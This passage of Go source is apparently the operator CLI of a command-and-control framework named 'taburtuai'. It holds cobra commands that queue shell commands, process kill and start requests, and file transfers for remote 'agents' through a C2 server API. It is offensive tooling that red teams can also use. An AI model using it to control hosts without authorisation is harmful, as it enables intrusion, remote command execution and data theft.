							for _, p := range processesInfo {
								id := getFloatFromMap(p, "Id")
								name := getStringFromMap(p, "ProcessName")
								path := getStringFromMap(p, "Path")        // Mungkin kosong
								desc := getStringFromMap(p, "Description") // Mungkin kosong
								fmt.Printf("  PID: %-6.0f Name: %-25s Path: %-40s Desc: %s\n", id, name, path, desc)
							}
						} else {
							// Jika bukan JSON atau gagal parse, tampilkan apa adanya
							fmt.Println(output)
						}
					}
				}
			}
		} else {
			printInfo("Use 'status " + commandID + "' to check.")
		}
	},
}

var processKillCmd = &cobra.Command{
	Use:   "kill <agent-id>",
	Short: "Kill a process on an agent by PID or name",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		pid, _ := cmd.Flags().GetInt("pid")
		name, _ := cmd.Flags().GetString("name")

		if pid == 0 && name == "" {
			printError("Either --pid or --name must be specified for kill.")
			return
		}

		payload := make(map[string]interface{})
		targetLog := ""
		if pid != 0 {
			payload["process_id"] = pid
			targetLog = fmt.Sprintf("PID %d", pid)
		} else {
			payload["process_name"] = name
			targetLog = fmt.Sprintf("name '%s'", name)
		}
		printInfo(fmt.Sprintf("Requesting to kill process %s on agent %s...", targetLog, agentID))

		jsonPayload, _ := json.Marshal(payload)
		serverRespBytes, err := makeAPIRequestWithMethod("POST", "/api/v1/agent/"+agentID+"/process/kill", bytes.NewBuffer(jsonPayload), "application/json")
		// ... (handle response, queue command, waitForCommand) ...
		if err != nil {
			printError(fmt.Sprintf("Request failed: %v", err))
			os.Exit(1)
		}
		var apiResp APIResponse
		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil { /*...*/
			return
		}
		if !apiResp.Success {
			printError("Server error: " + apiResp.Error)
			os.Exit(1)
		}

		dataMap, _ := apiResp.Data.(map[string]interface{})
		commandID, _ := dataMap["command_id"].(string)
		printSuccess("Process kill command queued. ID: " + commandID)
		if wait, _ := cmd.Flags().GetBool("wait"); wait {
			waitForCommand(commandID, 30)
		} else {
			printInfo("Use 'status " + commandID + "' to check.")
		}
	},
}

var processStartCmd = &cobra.Command{
	Use:   "start <agent-id> <process-path>",
	Short: "Start a new process on an agent",
	Args:  cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		procPath := args[1]
		procArgs, _ := cmd.Flags().GetString("args")

		printInfo(fmt.Sprintf("Requesting to start process '%s' with args '%s' on agent %s...", procPath, procArgs, agentID))
		payload := map[string]string{
			"process_path": procPath,
			"process_args": procArgs,
		}
		jsonPayload, _ := json.Marshal(payload)
		serverRespBytes, err := makeAPIRequestWithMethod("POST", "/api/v1/agent/"+agentID+"/process/start", bytes.NewBuffer(jsonPayload), "application/json")
		// ... (handle response, queue command, waitForCommand) ...
		if err != nil {
			printError(fmt.Sprintf("Request failed: %v", err))
			os.Exit(1)
		}
		var apiResp APIResponse
		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil { /*...*/
			return
		}
		if !apiResp.Success {
			printError("Server error: " + apiResp.Error)
			os.Exit(1)
		}

		dataMap, _ := apiResp.Data.(map[string]interface{})
		commandID, _ := dataMap["command_id"].(string)
		printSuccess("Process start command queued. ID: " + commandID)
		if wait, _ := cmd.Flags().GetBool("wait"); wait {
			waitForCommand(commandID, 30)
		} else {
			printInfo("Use 'status " + commandID + "' to check.")
		}
	},
}

// --- HELPER FUNCTIONS ---
func getStringFromMap(m map[string]interface{}, key string) string {
	if val, ok := m[key].(string); ok {
		return val
	}
	return ""
}

func getFloatFromMap(m map[string]interface{}, key string) float64 {
	if val, ok := m[key]; ok {
		if fVal, ok := val.(float64); ok {
			return fVal
		}
	}
	return 0
}

func makeAPIRequest(endpoint string) ([]byte, error) {
	return makeAPIRequestWithMethod("GET", endpoint, nil, "")
}

func makeAPIRequestWithMethod(method, endpoint string, body io.Reader, contentType string) ([]byte, error) {
	fullURL := config.ServerURL + endpoint
	printVerbose(fmt.Sprintf("Making %s request to: %s", method, fullURL))

	req, err := http.NewRequest(method, fullURL, body)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	if config.APIKey != "" {
		req.Header.Set("Authorization", "Bearer "+config.APIKey)
	}
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}

	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %w", err)
	}

	printVerbose(fmt.Sprintf("Response Status: %s", resp.Status))
	if verbose && len(respBody) < 500 { // Jangan print body besar di verbose
		printVerbose(fmt.Sprintf("Response Body: %s", string(respBody)))
	}

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		// Coba parse sebagai APIResponse untuk mendapatkan pesan error server
		var apiErr APIResponse
		if json.Unmarshal(respBody, &apiErr) == nil && apiErr.Error != "" {
			return respBody, fmt.Errorf("server error (status %d): %s", resp.StatusCode, apiErr.Error)
		}
		return respBody, fmt.Errorf("server returned status %s. Body: %s", resp.Status, string(respBody))
	}
	return respBody, nil
}

func executeShellCommand(agentID, commandStr string) {
	printVerbose(fmt.Sprintf("Shell command for %s: %s", agentID, commandStr))
	reqBody := map[string]interface{}{
		"agent_id": agentID,
		"command":  commandStr,
		"timeout":  60, // Timeout untuk perintah shell
	}
	reqJSON, _ := json.Marshal(reqBody)
	serverRespBytes, err := makeAPIRequestWithMethod("POST", "/api/v1/command", bytes.NewBuffer(reqJSON), "application/json")
	if err != nil {
		fmt.Printf("%sError sending shell command: %v%s\n", ColorRed, err, ColorReset)
		return
	}
	var apiResp APIResponse
	if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
		fmt.Printf("%sError parsing shell command response: %v%s\n", ColorRed, err, ColorReset)
		return
	}
	if !apiResp.Success {
		fmt.Printf("%sError from server: %s%s\n", ColorRed, apiResp.Error, ColorReset)
		return
	}
	dataMap, _ := apiResp.Data.(map[string]interface{})
	commandID, _ := dataMap["command_id"].(string)
	if commandID == "" {
		fmt.Printf("%sServer did not return command ID for shell command.%s\n", ColorRed, ColorReset)
		return
	}
	// Tunggu dan tampilkan output secara real-time (lebih kompleks) atau tunggu selesai
	// Untuk kesederhanaan, tunggu selesai dan tampilkan semua.
	finalStatusData := waitForCommand(commandID, 60) // Tunggu 60 detik
	if finalStatusData != nil {
		if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
			output, _ := statusMap["output"].(string)
			errorMsg, _ := statusMap["error"].(string)
			if output != "" {
				fmt.Print(output) // Print langsung, mungkin sudah ada newline
				if !strings.HasSuffix(output, "\n") {
					fmt.Println() // Tambah newline jika belum ada
				}
			}
			if errorMsg != "" {
				fmt.Printf("%s%s%s\n", ColorRed, errorMsg, ColorReset)
			}
		}
	}
}

func waitForCommand(commandID string, timeoutSeconds int) interface{} {
	spinner := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
	spinIdx := 0
	startTime := time.Now()
	// Jika timeoutSeconds adalah 0 dari flag, gunakan default yang lebih tinggi
	if timeoutSeconds == 0 {
		timeoutSeconds = 300 // Default 5 menit jika tidak diset
	}
	maxDuration := time.Duration(timeoutSeconds) * time.Second

	for time.Since(startTime) < maxDuration {
		statusRespBytes, err := makeAPIRequest(fmt.Sprintf("/api/v1/command/%s/status", commandID))
		if err != nil {
			fmt.Printf("\r%s Error checking status: %v. Retrying... %s\n", ColorRed, err, ColorReset)
			time.Sleep(2 * time.Second)
			continue
		}
		var statusAPIResp APIResponse
		if err := json.Unmarshal(statusRespBytes, &statusAPIResp); err != nil {
			fmt.Printf("\r%s Error parsing status response. Retrying... %s\n", ColorRed, ColorReset)
			time.Sleep(1 * time.Second)
			continue
		}
		if !statusAPIResp.Success {
			if strings.Contains(statusAPIResp.Error, "Command not found") {
				fmt.Printf("\r%s Command %s not found. %s\n", ColorRed, commandID, ColorReset)
				return nil
			}
			fmt.Printf("\r%s Server error on status: %s. Retrying... %s\n", ColorRed, statusAPIResp.Error, ColorReset)
			time.Sleep(2 * time.Second)
			continue
		}
		if statusAPIResp.Data == nil {
			fmt.Printf("\r%s No data in status. Retrying... %s", ColorYellow, ColorReset)
			time.Sleep(1 * time.Second)
			continue
		}
		cmdData, ok := statusAPIResp.Data.(map[string]interface{})
		if !ok {
			fmt.Printf("\r%s Invalid data format in status. Retrying... %s", ColorYellow, ColorReset)
			time.Sleep(1 * time.Second)
			continue
		}
		status, _ := cmdData["status"].(string)
		fmt.Printf("\r%s Status: %s %s %s", ColorCyan, status, spinner[spinIdx], ColorReset)
		spinIdx = (spinIdx + 1) % len(spinner)
		switch status {
		case "completed", "failed", "timeout":
			fmt.Printf("\r%s Status: %s. Finalizing...                %s\n", ColorGreen, status, ColorReset)
			displayFinalCommandStatus(cmdData, commandID)
			return cmdData
		}
		time.Sleep(500 * time.Millisecond)
	}
	fmt.Printf("\r%s Timed out waiting for command %s after %d seconds. %s\n", ColorRed, commandID, timeoutSeconds, ColorReset)
	statusRespBytes, err := makeAPIRequest(fmt.Sprintf("/api/v1/command/%s/status", commandID))
	if err == nil {
		var statusAPIResp APIResponse
		if json.Unmarshal(statusRespBytes, &statusAPIResp) == nil && statusAPIResp.Success {
			if cmdData, ok := statusAPIResp.Data.(map[string]interface{}); ok {
				displayFinalCommandStatus(cmdData, commandID)
				return cmdData
			}
		}
	}
	return nil
}

func displayFinalCommandStatus(cmdData map[string]interface{}, commandID string) {
	status := getStringFromMap(cmdData, "status")
	exitCode := int(getFloatFromMap(cmdData, "exit_code"))
	output := getStringFromMap(cmdData, "output")
	errorMsg := getStringFromMap(cmdData, "error")
	opType := getStringFromMap(cmdData, "operation_type")
	cmdStr := getStringFromMap(cmdData, "command")

	fmt.Printf("%s\n%sFinal Status for Command ID %s (%s: %s):%s\n", strings.Repeat("=", 60), ColorBlue, commandID, opType, cmdStr, ColorReset)
	fmt.Printf("%sStatus:%s ", ColorCyan, ColorReset)
	switch status {
	case "completed":
		fmt.Printf("%s%s%s\n", ColorGreen, status, ColorReset)
	case "failed", "timeout":
		fmt.Printf("%s%s%s\n", ColorRed, status, ColorReset)
	default:
		fmt.Println(status)
	}
	if opType == "execute" { // Exit code lebih relevan untuk execute
		fmt.Printf("%sExit Code:%s %d\n", ColorCyan, ColorReset, exitCode)
	}
	if output != "" {
		fmt.Printf("\n%sOutput:%s\n", ColorGreen, ColorReset)
		// Jangan tampilkan konten file besar secara langsung di sini
		if (opType == "download" && strings.HasPrefix(output, "[File content too large")) || (len(output) > 1024 && opType != "upload") {
			fmt.Println(output) // Pesan dari server sudah cukup
		} else if opType == "upload" {
			fmt.Println(output) // Pesan konfirmasi upload
		} else if len(output) > 1024 {
			fmt.Printf("%s... (Output truncated, %d bytes total)\n", output[:1000], len(output))
		} else {
			fmt.Println(output)
		}
	}
	if errorMsg != "" {
		fmt.Printf("\n%sError:%s\n%s\n", ColorRed, ColorReset, errorMsg)
	}
	fmt.Println(strings.Repeat("=", 60))
}

func printInfo(msg string)    { fmt.Printf("%s[INFO]%s %s\n", ColorBlue, ColorReset, msg) }
func printSuccess(msg string) { fmt.Printf("%s[SUCCESS]%s %s\n", ColorGreen, ColorReset, msg) }
func printWarning(msg string) { fmt.Printf("%s[WARNING]%s %s\n", ColorYellow, ColorReset, msg) }
func printError(msg string)   { fmt.Printf("%s[ERROR]%s %s\n", ColorRed, ColorReset, msg) }
func printVerbose(msg string) {
	if verbose {
		fmt.Printf("%s[DEBUG]%s %s\n", ColorPurple, ColorReset, msg)
	}
}

// Initialize commands
func init() {
	// Global flags
	// Default untuk serverURL diambil dari ENV atau string kosong jika ENV tidak diset.
	// Cobra akan menggunakan nilai default di sini jika flag tidak diberikan & ENV kosong.
	rootCmd.PersistentFlags().StringVarP(&config.ServerURL, "server", "s", os.Getenv("TABURTUAI_SERVER"), "C2 server URL (default \"http://localhost:8080\" if TABURTUAI_SERVER env not set)")
	if config.ServerURL == "" { // Jika ENV kosong, Cobra tidak otomatis set default string kosong ke default flag
		config.ServerURL = "http://localhost:8080" // Set default eksplisit jika ENV kosong
	}
	rootCmd.PersistentFlags().StringVarP(&config.APIKey, "api-key", "k", os.Getenv("TABURTUAI_API_KEY"), "API key for authentication")
	rootCmd.PersistentFlags().IntVarP(&config.Timeout, "timeout", "t", 30, "Request timeout in seconds")
	rootCmd.PersistentFlags().BoolVarP(&verbose, "verbose", "v", false, "Enable verbose output")

	// Add commands to root
	rootCmd.AddCommand(agentsCmd)
	rootCmd.AddCommand(cmdCmd)
	rootCmd.AddCommand(shellCmd)
	rootCmd.AddCommand(statusCmd)
	rootCmd.AddCommand(historyCmd)
	rootCmd.AddCommand(queueCmd)
	rootCmd.AddCommand(filesCmd)
	rootCmd.AddCommand(logsCmd)
	rootCmd.AddCommand(statsCmd)
	rootCmd.AddCommand(versionCmd)
	rootCmd.AddCommand(processCmd)

	// Add subcommands to agents
	agentsCmd.AddCommand(agentsListCmd)
	agentsCmd.AddCommand(agentsInfoCmd)

	// Add subcommands to queue
	queueCmd.AddCommand(queueStatsCmd)
	queueCmd.AddCommand(queueClearCmd)

	// Add subcommands to files
	filesCmd.AddCommand(filesUploadCmd)
	filesCmd.AddCommand(filesDownloadCmd)

	// Add subcommands to process
	processCmd.AddCommand(processListCmd)
	processCmd.AddCommand(processKillCmd)
	processCmd.AddCommand(processStartCmd)

	// Command flags
	cmdCmd.Flags().Int("timeout", 300, "Command timeout in seconds (server default if 0)")
	cmdCmd.Flags().StringP("workdir", "w", "", "Working directory for command")
	cmdCmd.Flags().BoolP("background", "b", false, "Run command in background")

	historyCmd.Flags().IntP("limit", "l", 50, "Number of commands to show")
	historyCmd.Flags().StringP("status", "", "", "Filter by status (completed, failed, etc)")

	logsCmd.Flags().IntP("limit", "l", 100, "Number of log entries to show (server uses 'count')")

	filesUploadCmd.Flags().Bool("wait", false, "Wait for the upload to complete on the agent")
	filesDownloadCmd.Flags().Bool("wait", false, "Wait for the download to complete on server")

	// Flags untuk sub-command process:
	processListCmd.Flags().Bool("wait", true, "Wait for the process list to be returned")

	// >>> BAGIAN KRUSIAL UNTUK ERROR ANDA ADA DI SINI <<<
	processKillCmd.Flags().IntP("pid", "p", 0, "Process ID (PID) to kill")
	processKillCmd.Flags().StringP("name", "n", "", "Process name to kill (e.g., notepad.exe)") // Pastikan "--name" dan "-n" benar
	processKillCmd.Flags().Bool("wait", true, "Wait for the kill confirmation")
	// >>> AKHIR BAGIAN KRUSIAL <<<

	processStartCmd.Flags().StringP("args", "a", "", "Arguments for the process to start")
	processStartCmd.Flags().Bool("wait", false, "Wait for the start confirmation")
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		// Pesan error sudah dicetak oleh Cobra atau fungsi kita
		os.Exit(1)
	}
}
